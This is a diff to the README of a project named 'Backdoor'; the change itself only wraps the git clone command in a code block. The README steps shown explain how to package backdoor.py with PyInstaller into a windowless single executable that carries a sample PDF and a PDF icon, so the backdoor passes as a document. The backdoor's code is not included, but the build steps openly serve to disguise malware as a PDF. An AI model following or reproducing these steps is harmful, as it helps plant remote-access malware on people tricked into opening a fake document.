@@ -10,7 +10,9 @@ You should have these requirements :
 4. Must have docker installed if using it
 
 ## Steps :
-1. do git clone https://github.com/Anonomous69/Backdoor
+1. ```zsh
+   git clone https://github.com/Anonomous69/Backdoor
+   ```
 2. cd to directory
 3. do C:\Users\username\Appdata\wherever\your\pyinstaller\is\there\pyintstaller.exe --add-data=sample.pdf:.  -—onefile -—noconsole --icon pdf.ico backdoor.py
 4. The created backdoor must be in your "dist" folder in that directory
